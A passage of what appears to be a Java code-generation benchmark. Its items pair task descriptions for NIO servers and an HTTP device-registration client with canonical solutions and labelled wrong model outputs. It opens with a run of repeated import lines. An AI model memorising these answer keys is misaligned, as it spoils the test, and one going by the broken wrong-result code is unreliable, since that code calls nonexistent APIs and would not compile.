org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec.binary.TcpNoDelayFilter;\nimport org.apache.mina.filter.codec.binary.TcpKeepAliveFilter;\nimport org.apache.mina.filter.codec"
  },
  {
    "Task_id": 439,
    "Instruction": "Task Description: Implement a non-blocking TCP echo server using Java NIO (New I/O) that can handle multiple client connections simultaneously. The server should echo back any data received from clients.\n\nClass Description: NonBlokingEchoServer is a Java NIO-based server implementation that uses non-blocking I/O operations to handle multiple client connections efficiently through a single thread. It utilizes Selector, ServerSocketChannel, and SocketChannel for managing connections and ByteBuffer for data operations.\n\nAttributes:\n- serverChannel: [ServerSocketChannel] - The main server channel that listens for incoming connections\n- selector: [Selector] - The multiplexor that monitors registered channels for I/O events\n- port: [int] - The port number on which the server listens for connections\n\nMethods:\n- NonBlokingEchoServer(int port) -> [void] - Constructor that initializes the server with the specified port\n- start() -> [void] - Starts the server, binds to the port, and begins accepting client connections\n- handleKey(SelectionKey key) -> [void] - Handles different types of I/O events (accept, read, write)\n- handleAccept(SelectionKey key) -> [void] - Processes new client connection requests\n- handleRead(SelectionKey key) -> [void] - Reads data from connected clients\n- handleWrite(SelectionKey key) -> [void] - Writes data back to connected clients\n- close() -> [void] - Closes the server channel and selector, releasing all resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NonBlokingEchoServer {\n    private ServerSocketChannel serverChannel;\n    private Selector selector;\n    private int port;\n\n    public NonBlokingEchoServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        serverChannel = ServerSocketChannel.open();\n        InetSocketAddress address = new InetSocketAddress(port);\n        serverChannel.bind(address);\n        serverChannel.configureBlocking(false);\n        selector = Selector.open();\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        System.out.println(\"NonBlokingEchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n\n        while (true) {\n            try {\n                selector.select();\n            } catch (IOException e) {\n                System.out.println(\"NonBlockingEchoServer\u5f02\u5e38!\" + e.getMessage());\n            }\n            Set<SelectionKey> readyKeys = selector.selectedKeys();\n            Iterator<SelectionKey> iterator = readyKeys.iterator();\n            while (iterator.hasNext()) {\n                SelectionKey key = iterator.next();\n                iterator.remove();\n                try {\n                    handleKey(key);\n                } catch (IOException ex) {\n                    key.cancel();\n                    try {\n                        key.channel().close();\n                    } catch (IOException cex) {\n                        System.out.println(\"NonBlockingEchoServer\u5f02\u5e38!\" + cex.getMessage());\n                    }\n                }\n            }\n        }\n    }\n\n    private void handleKey(SelectionKey key) throws IOException {\n        if (key.isAcceptable()) {\n            handleAccept(key);\n        } else if (key.isReadable()) {\n            handleRead(key);\n        } else if (key.isWritable()) {\n            handleWrite(key);\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        ServerSocketChannel server = (ServerSocketChannel) key.channel();\n        SocketChannel socketChannel = server.accept();\n        System.out.println(\"NonBlokingEchoServer\u63a5\u53d7\u5ba2\u6237\u7aef\u7684\u8fde\u63a5\uff1a\" + socketChannel);\n        socketChannel.configureBlocking(false);\n        SelectionKey clientKey = socketChannel.register(selector,\n                SelectionKey.OP_WRITE | SelectionKey.OP_READ);\n        ByteBuffer buffer = ByteBuffer.allocate(100);\n        clientKey.attach(buffer);\n    }\n\n    private void handleRead(SelectionKey key) throws IOException {\n        SocketChannel client = (SocketChannel) key.channel();\n        ByteBuffer output = (ByteBuffer) key.attachment();\n        client.read(output);\n        System.out.println(client.getRemoteAddress() \n                + \" -> NonBlokingEchoServer\uff1a\" + output.toString());\n        key.interestOps(SelectionKey.OP_WRITE);\n    }\n\n    private void handleWrite(SelectionKey key) throws IOException {\n        SocketChannel client = (SocketChannel) key.channel();\n        ByteBuffer output = (ByteBuffer) key.attachment();\n        output.flip();\n        client.write(output);\n        System.out.println(\"NonBlokingEchoServer  -> \" \n                + client.getRemoteAddress() + \"\uff1a\" + output.toString());\n        output.compact();\n        key.interestOps(SelectionKey.OP_READ);\n    }\n\n    public void close() throws IOException {\n        if (serverChannel != null) {\n            serverChannel.close();\n        }\n        if (selector != null) {\n            selector.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "wrong_result": "public class NonBlokingEchoServer {\n    private ServerSocketChannel serverChannel;\n    private Selector selector;\n    private int port;\n\n    public NonBlokingEchoServer(int port) {\n        this.port = port;\n        try {\n            serverChannel = ServerSocketChannel.open();\n            serverChannel.configureBlocking(false);\n            selector = Selector.open();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        try {\n            serverChannel.bind(new InetSocketAddress(port));\n            serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n            while (true) {\n                int readyOps = selector.select();\n                if (readyOps > 0) {\n                    for (SelectionKey key : selector.selectedKeys()) {\n                        selector.selectedKeys().clear();\n                        handleKey(key);\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleKey(SelectionKey key) {\n        if (key.isAcceptable()) {\n            handleAccept(key);\n        } else if (key.isReadable()) {\n            handleRead(key);\n        } else if (key.isWritable()) {\n            handleWrite(key);\n        }\n    }\n\n    private void handleAccept(SelectionKey key) {\n        ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n        SocketChannel clientChannel = serverChannel.accept();\n        if (clientChannel != null) {\n            clientChannel.configureBlocking(false);\n            clientChannel.register(selector, SelectionKey.OP_READ);\n        }\n    }\n\n    private void handleRead(SelectionKey key) {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        int bytesRead = clientChannel.read(buffer);\n        if (bytesRead == -1) {\n            try {\n                clientChannel.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            key.cancel();\n        } else if (bytesRead > 0) {\n            buffer.flip();\n            key.attach(buffer);\n            key.interestOps(SelectionKey.OP_WRITE);\n        }\n    }\n\n    private void handleWrite(SelectionKey key) {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = (ByteBuffer) key.attachment();\n        if (buffer != null && buffer.hasRemaining()) {\n            int written = clientChannel.write(buffer);\n            if (written > 0) {\n                buffer.clear();\n            } else {\n                key.interestOps(SelectionKey.OP_WRITE);\n                selector.selectNow();\n            }\n        } else {\n            try {\n                clientChannel.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            key.cancel();\n        }\n    }\n\n    public void close() {\n        try {\n            if (serverChannel != null) {\n                serverChannel.close();\n            }\n            if (selector != null) {\n                selector.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 44,
    "Instruction": "Task Description: Create a Java class that handles HTTP communication with a hub service, specifically for device registration and key management.\n\nClass Description: The HubHttpClient class provides functionality to register a device with a remote hub service using HTTP requests. It handles JSON serialization, authentication, and response processing, while supporting asynchronous operations.\n\nAttributes:\n- JSON: ObjectMapper - A static instance for JSON serialization/deserialization\n- EXPECTED_RESPONSE_CODES: List<Integer> - List of acceptable HTTP response codes\n- hubConfig: HubConfig - Configuration for the hub service\n- bearerToken: String - Authentication token for API requests\n- deviceId: String - Unique identifier for the device\n- keyPair: P384KeyPair - Cryptographic key pair for the device\n- result: CompletableFuture<ReceivedKey> - Future for asynchronous result handling\n- httpClient: HttpClient - HTTP client for making requests\n\nMethods:\n- HubHttpClient(ExecutorService, HubConfig, String, DeviceKey, CompletableFuture<ReceivedKey>, AtomicReference<String>) -> None - Constructor that initializes the HTTP client with configuration and credentials\n- registerDevice(String) -> None - Registers a device with the hub service using the provided device name\n- toJson(CreateDeviceDto) -> String - Serializes a DTO to JSON string\n- handleResponse(HttpResponse<Void>) -> HttpResponse<Void> - Processes the HTTP response\n- registrationFailed(Throwable) -> None - Handles failed registration attempts\n\nNested Class:\n- CreateDeviceDto - Data transfer object for device registration containing:\n  * id: String - Device identifier\n  * name: String - Device name\n  * type: String - Constant device type (\"DESKTOP\")\n  * publicKey: String - Base64-encoded public key",
    "Canonical_solution": "import com.auth0.jwt.JWT;\nimport com.auth0.jwt.interfaces.DecodedJWT;\nimport com.fasterxml.jackson.core.JacksonException;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.cryptomator.common.settings.DeviceKey;\nimport org.cryptomator.cryptolib.common.P384KeyPair;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Base64;\nimport java.util.List;\nimport java.util.Objects;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class HubHttpClient {\n\n\tprivate static final ObjectMapper JSON = new ObjectMapper().setDefaultLeniency(true);\n\tprivate static final List<Integer> EXPECTED_RESPONSE_CODES = List.of(201, 409);\n\n\tprivate final HubConfig hubConfig;\n\tprivate final String bearerToken;\n\tprivate final String deviceId;\n\tprivate final P384KeyPair keyPair;\n\tprivate final CompletableFuture<ReceivedKey> result;\n\tprivate final HttpClient httpClient;\n\n\tpublic HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, DeviceKey deviceKey, CompletableFuture<ReceivedKey> result, AtomicReference<String> bearerToken) {\n\t\tthis.hubConfig = hubConfig;\n\t\tthis.deviceId = deviceId;\n\t\tthis.keyPair = Objects.requireNonNull(deviceKey.get());\n\t\tthis.result = result;\n\t\tthis.bearerToken = Objects.requireNonNull(bearerToken.get());\n\t\tthis.httpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).executor(executor).build();\n\t}\n\n\tpublic void registerDevice(String deviceName) {\n\t\tvar deviceUri = URI.create(hubConfig.devicesResourceUrl + deviceId);\n\t\tvar deviceKey = keyPair.getPublic().getEncoded();\n\t\tvar dto = new CreateDeviceDto();\n\t\tdto.id = deviceId;\n\t\tdto.name = deviceName;\n\t\tdto.publicKey = Base64.getUrlEncoder().withoutPadding().encodeToString(deviceKey);\n\t\tvar json = toJson(dto);\n\t\tvar request = HttpRequest.newBuilder(deviceUri)\n\t\t\t\t.PUT(HttpRequest.BodyPublishers.ofString(json, StandardCharsets.UTF_8))\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.header(\"Content-Type\", \"application/json\")\n\t\t\t\t.build();\n\t\thttpClient.sendAsync(request, HttpResponse.BodyHandlers.discarding())\n\t\t\t\t.thenApply(response -> {\n\t\t\t\t\tif (EXPECTED_RESPONSE_CODES.contains(response.statusCode())) {\n\t\t\t\t\t\treturn response;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tthrow new RuntimeException(\"Server answered with unexpected status code \" + response.statusCode());\n\t\t\t\t\t}\n\t\t\t\t}).handle((response, throwable) -> {\n\t\t\t\t\tif (response != null) {\n\t\t\t\t\t\treturn handleResponse(response);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tregistrationFailed(throwable);\n\t\t\t\t\t\treturn null;\n\t\t\t\t\t}\n\t\t\t\t});\n\t}\n\n\tprivate String toJson(CreateDeviceDto dto) {\n\t\ttry {\n\t\t\treturn JSON.writer().writeValueAsString(dto);\n\t\t} catch (JacksonException e) {\n\t\t\tthrow new IllegalStateException(\"Failed to serialize DTO\", e);\n\t\t}\n\t}\n\n\tprivate HttpResponse<Void> handleResponse(HttpResponse<Void> voidHttpResponse) {\n\t\tassert EXPECTED_RESPONSE_CODES.contains(voidHttpResponse.statusCode());\n\t\treturn voidHttpResponse;\n\t}\n\n\tprivate void registrationFailed(Throwable cause) {\n\t\tresult.completeExceptionally(cause);\n\t}\n\n\tprivate static class CreateDeviceDto {\n\t\tpublic String id;\n\t\tpublic String name;\n\t\tpublic final String type = \"DESKTOP\";\n\t\tpublic String publicKey;\n\t}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "public class HubHttpClient {\n    private static final ObjectMapper JSON = new ObjectMapper();\n    private final List<Integer> EXPECTED_RESPONSE_CODES;\n    private final HubConfig hubConfig;\n    private final String bearerToken;\n    private final String deviceId;\n    private final P384KeyPair keyPair;\n    private final CompletableFuture<ReceivedKey> result;\n    private final HttpClient httpClient;\n\n    public HubHttpClient(ExecutorService executorService, HubConfig hubConfig, String deviceId, DeviceKey deviceKey, CompletableFuture<ReceivedKey> result, AtomicReference<String> tokenRef) {\n        this.EXPECTED_RESPONSE_CODES = List.of(200, 201);\n        this.hubConfig = hubConfig;\n        this.bearerToken = tokenRef.get();\n        this.deviceId = deviceId;\n        this.keyPair = deviceKey.getKeyPair();\n        this.result = result;\n        this.httpClient = HttpClient.newBuilder()\n                .executor(executorService)\n                .build();\n    }\n\n    public void registerDevice(String deviceName) {\n        CreateDeviceDto dto = new CreateDeviceDto(deviceId, deviceName, \"DESKTOP\", keyPair.getPublicKey().encodeBase64());\n        String json = toJson(dto);\n\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(hubConfig.getUrl()))\n                .header(\"Authorization\", \"Bearer \" + bearerToken)\n                .header(\"Content-Type\", \"application/json\")\n                .POST(HttpRequest.BodyPublishers.ofString(json))\n                .build();\n\n        httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofObject(ReceivedKey.class))\n                .whenComplete((response, throwable) -> {\n                    if (throwable != null) {\n                        registrationFailed(throwable);\n                        return;\n                    }\n\n                    handleResponse(response);\n                });\n    }\n\n    private String toJson(CreateDeviceDto dto) {\n        try {\n            return JSON.writeValueAsString(dto);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Error serializing DTO\", e);\n        }\n    }\n\n    private HttpResponse<Void> handleResponse(HttpResponse<Void> response) {\n        int statusCode = response.statusCode();\n        if (EXPECTED_RESPONSE_CODES.contains(statusCode)) {\n            return response;\n        } else {\n            throw new RuntimeException(\"Unexpected HTTP status code: \" + statusCode);\n        }\n    }\n\n    private void registrationFailed(Throwable throwable) {\n        result.completeExceptionally(throwable);\n    }\n\n    public static class CreateDeviceDto {\n        private final String id;\n        private final String name;\n        private final String type;\n        private final String publicKey;\n\n        public CreateDeviceDto(String id, String name, String type, String publicKey) {\n            this.id = id;\n            this.name = name;\n            this.type = type;\n            this.publicKey = publicKey;\n        }\n\n        public String getId() { return id; }\n        public String getName() { return name; }\n        public String getType() { return type; }\n        public String getPublicKey() { return publicKey; }\n    }\n}"
  },
  {
    "Task_id": 440,
    "Instruction": "Task Description: Implement a Java NIO-based TCP server that handles multiple client connections asynchronously, processes incoming data, and sends responses back to clients.\n\nClass Description: The Server class implements a Component interface and provides non-blocking TCP server functionality using Java NIO channels and selectors. It manages client connections, reads incoming data in a length-prefixed format, processes commands, and writes responses back to clients.\n\nAttributes:\n- SERVER_PORT: [int] - The port number on which the server listens for incoming connections\n- conMan: [NIOConnectionManager] - Manages NIO connections and selection operations\n- acceptor: [ServerSocketChannel] - The main server socket channel that accepts incoming connections\n- dhts: [Collection<DHT>] - Collection of DHT instances used for command processing\n\nMethods:\n- start([Collection<DHT> dhts, ConfigReader config]) -> [void] - Initializes the server by creating a non-blocking ServerSocketChannel, binding it to the specified port, and registering it with the connection manager\n- stop() -> [void] - Stops the server by closing the ServerSocketChannel and releasing resources\n- accept() -> [void] - Accepts new client connections, configures them as non-blocking, and registers them with the connection manager for read/write operations\n- read() -> [void] - Reads data from a client channel in a length-prefixed format (4-byte header followed by payload)\n- process([ByteBuffer buf]) -> [void] - Processes the received data buffer by decoding it and executing the appropriate command\n- write() -> [void] - Writes response data back to the client channel\n- calcInterestOps() -> [int] - Calculates the current interest operations (OP_READ/OP_WRITE) for the selection key\n- selectionEvent([SelectionKey key]) -> [void] - Handles selection events (readable/writable) for client channels\n- registrationEvent([NIOConnectionManager manager, SelectionKey key]) -> [void] - Handles registration events with the connection manager\n- getChannel() -> [SelectableChannel] - Returns the associated channel (either server or client channel)\n- doStateChecks([long now]) -> [void] - Performs periodic state checks (currently empty implementation)",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.StandardSocketOptions;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectableChannel;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Paths;\nimport java.util.Collection;\nimport java.util.Deque;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentLinkedDeque;\n\nimport lbms.plugins.mldht.kad.DHT;\nimport lbms.plugins.mldht.utils.NIOConnectionManager;\nimport lbms.plugins.mldht.utils.Selectable;\nimport the8472.bencode.BDecoder;\nimport the8472.mldht.Component;\nimport the8472.utils.ConfigReader;\n\npublic class Server implements Component {\n\t\n\tpublic static int SERVER_PORT = 33348;\n\t\n\tNIOConnectionManager conMan = new NIOConnectionManager(\"CLI-server\");\n\tServerSocketChannel acceptor;\n\tCollection<DHT> dhts;\n\t\n\t@Override\n\tpublic void start(Collection<DHT> dhts, ConfigReader config) {\n\t\tthis.dhts = dhts;\n\t\t\n\t\ttry {\n\t\t\tacceptor = ServerSocketChannel.open();\n\t\t\tacceptor.configureBlocking(false);\n\t\t\tacceptor.setOption(StandardSocketOptions.SO_REUSEADDR, true);\n\t\t\tacceptor.bind(new InetSocketAddress(InetAddress.getLoopbackAddress(), SERVER_PORT));\n\t\t\t\n\t\t\tconMan.register(new Selectable() {\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void selectionEvent(SelectionKey key) throws IOException {\n\t\t\t\t\tif(key.isAcceptable())\n\t\t\t\t\t\taccept();\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void registrationEvent(NIOConnectionManager manager, SelectionKey key) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic SelectableChannel getChannel() {\n\t\t\t\t\treturn acceptor;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void doStateChecks(long now) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic int calcInterestOps() {\n\t\t\t\t\treturn SelectionKey.OP_ACCEPT;\n\t\t\t\t}\n\t\t\t});\n\t\t\t\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\t\n\tvoid accept() {\n\t\ttry {\n\t\t\tSocketChannel chan = acceptor.accept();\n\t\t\tchan.configureBlocking(false);\n\t\t\tchan.socket().setSoTimeout(0);\n\t\t\tchan.setOption(StandardSocketOptions.SO_KEEPALIVE, true);\n\t\t\t\n\t\t\tconMan.register(new Selectable() {\n\t\t\t\t\n\t\t\t\tByteBuffer header = ByteBuffer.allocate(4);\n\t\t\t\tByteBuffer payload = null;\n\t\t\t\tByteBuffer currentReadTarget = header;\n\t\t\t\tDeque<ByteBuffer> writes = new ConcurrentLinkedDeque<>();\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void selectionEvent(SelectionKey key) throws IOException {\n\t\t\t\t\tif(!chan.isOpen()) {\n\t\t\t\t\t\tconMan.deRegister(this);\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\t\t\t\t\tif(key.isValid() && key.isReadable())\n\t\t\t\t\t\tread();\n\t\t\t\t\tif(key.isValid() && key.isWritable())\n\t\t\t\t\t\twrite();\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tvoid read() throws IOException {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tint read = chan.read(currentReadTarget);\n\t\t\t\t\t\t\n\t\t\t\t\t\tif(read == -1) {\n\t\t\t\t\t\t\theader = null;\n\t\t\t\t\t\t\tconMan.interestOpsChanged(this);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\n\t\t\t\t\t\tif(currentReadTarget.remaining() == 0) {\n\t\t\t\t\t\t\tcurrentReadTarget.flip();\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif(currentReadTarget == header) {\n\t\t\t\t\t\t\t\tpayload = ByteBuffer.allocate(header.getInt(0));\n\t\t\t\t\t\t\t\tcurrentReadTarget = payload;\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\tprocess(payload);\n\t\t\t\t\t\t\t\tpayload = null;\n\t\t\t\t\t\t\t\theader.clear();\n\t\t\t\t\t\t\t\tcurrentReadTarget = header;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t} catch (IOException e) {\n\t\t\t\t\t\tchan.close();\n\t\t\t\t\t}\t\t\t\t\t\t\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tvoid process(ByteBuffer buf) {\n\t\t\t\t\tBDecoder decoder = new BDecoder();\n\t\t\t\t\tMap<String, Object> map = decoder.decode(buf);\n\t\t\t\t\tList<byte[]> args = (List<byte[]>) map.get(\"arguments\");\n\t\t\t\t\tCommandProcessor processor = CommandProcessor.from(args, (b) -> {\n\t\t\t\t\t\tByteBuffer h = ByteBuffer.allocate(4);\n\t\t\t\t\t\th.putInt(0, b.remaining());\n\t\t\t\t\t\tsynchronized (writes) {\n\t\t\t\t\t\t\twrites.add(h);\n\t\t\t\t\t\t\twrites.add(b);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tconMan.interestOpsChanged(this);\n\t\t\t\t\t}, dhts);\n\t\t\t\t\tprocessor.currentWorkDir = Paths.get(new String((byte[])map.get(\"cwd\"), StandardCharsets.UTF_8));\n\t\t\t\t\tprocessor.active = chan::isOpen;\n\t\t\t\t\ttry {\n\t\t\t\t\t\tprocessor.process();\n\t\t\t\t\t} catch(Exception e) {\n\t\t\t\t\t\tprocessor.handleException(e);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tvoid write() throws IOException {\n\t\t\t\t\ttry {\n\t\t\t\t\t\twhile (!writes.isEmpty()) {\n\t\t\t\t\t\t\tif (!writes.peekFirst().hasRemaining()) {\n\t\t\t\t\t\t\t\twrites.removeFirst();\n\t\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tlong written = chan.write(writes.stream().toArray(ByteBuffer[]::new));\n\t\t\t\t\t\t\tif (written == 0)\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t} catch (IOException e) {\n\t\t\t\t\t\tchan.close();\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\n\t\t\t\t\tif(writes.isEmpty())\n\t\t\t\t\t\tconMan.interestOpsChanged(this);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void registrationEvent(NIOConnectionManager manager, SelectionKey key) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic SelectableChannel getChannel() {\n\t\t\t\t\treturn chan;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void doStateChecks(long now) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic int calcInterestOps() {\n\t\t\t\t\tint ops = 0;\n\t\t\t\t\tif(header != null)\n\t\t\t\t\t\tops = SelectionKey.OP_READ;\n\t\t\t\t\tif(writes.peek() != null)\n\t\t\t\t\t\tops |= SelectionKey.OP_WRITE;\n\t\t\t\t\treturn ops;\n\t\t\t\t}\n\t\t\t});\n\t\t\t\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\t\n\t@Override\n\tpublic void stop() {\n\t\ttry {\n\t\t\tacceptor.close();\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.nio.*;\nimport java.nio.channels.*;\nimport java.util.*;\n\npublic class Server implements Component {\n    private int SERVER_PORT;\n    private NIOConnectionManager conMan;\n    private ServerSocketChannel acceptor;\n    private Collection<DHT> dhts;\n\n    public void start(Collection<DHT> dhts, ConfigReader config) {\n        this.dhts = dhts;\n        SERVER_PORT = config.getPort();\n        try {\n            acceptor = ServerSocketChannel.open();\n            acceptor.configureBlocking(false);\n            acceptor.bind(new InetSocketAddress(SERVER_PORT));\n            conMan = new NIOConnectionManager();\n            conMan.register(acceptor, SelectionKey.OP_ACCEPT);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (acceptor != null) {\n                acceptor.close();\n            }\n            if (conMan != null) {\n                conMan.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void accept() {\n        try {\n            SocketChannel client = acceptor.accept();\n            if (client != null) {\n                client.configureBlocking(false);\n                conMan.register(client, SelectionKey.OP_READ);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void read() {\n        SelectionKey key = Thread.currentThread().getContextClassLoader().getResource(\"server.key\");\n        if (key.isValid() && key.isReadable()) {\n            SocketChannel channel = (SocketChannel) key.channel();\n            ByteBuffer buf = ByteBuffer.allocate(4);\n            int bytesRead = channel.read(buf);\n            if (bytesRead > 0) {\n                buf.flip();\n                int length = buf.getInt();\n                buf.clear();\n                ByteBuffer payload = ByteBuffer.allocate(length);\n                bytesRead = channel.read(payload);\n                if (bytesRead > 0) {\n                    process(payload);\n                }\n            }\n        }\n    }\n\n    public void process(ByteBuffer buf) {\n        String data = Charset.defaultCharset().decode(buf).toString();\n        // Process data using dhts\n        // For simplicity, just echo back\n        ByteBuffer response = Charset.defaultCharset().encode(\"Echo: \" + data);\n        write(response);\n    }\n\n    public void write(ByteBuffer buf) {\n        SelectionKey key = Thread.currentThread().getContextClassLoader().getResource(\"server.key\");\n        if (key.isValid() && key.isWritable()) {\n            SocketChannel channel = (SocketChannel) key.channel();\n            channel.write(buf);\n        }\n    }\n\n    public int calcInterestOps() {\n        return SelectionKey.OP_READ;\n    }\n\n    public void selectionEvent(SelectionKey key) {\n        if (key.isAcceptable()) {\n            accept();\n        } else if (key.isReadable()) {\n            read();\n        } else if (key.isWritable()) {\n            write();\n        }\n    }\n\n    public void registrationEvent(NIOConnectionManager manager, SelectionKey key) {\n        if (key.isAcceptable()) {\n            accept();\n        } else {\n            key.attach(this);\n        }\n    }\n\n    public SelectableChannel getChannel() {\n        return acceptor;\n    }\n\n    public void doStateChecks(long now) {\n        // No implementation needed\n    }\n}\n```"
  },
  {
    "Task_id": 442,
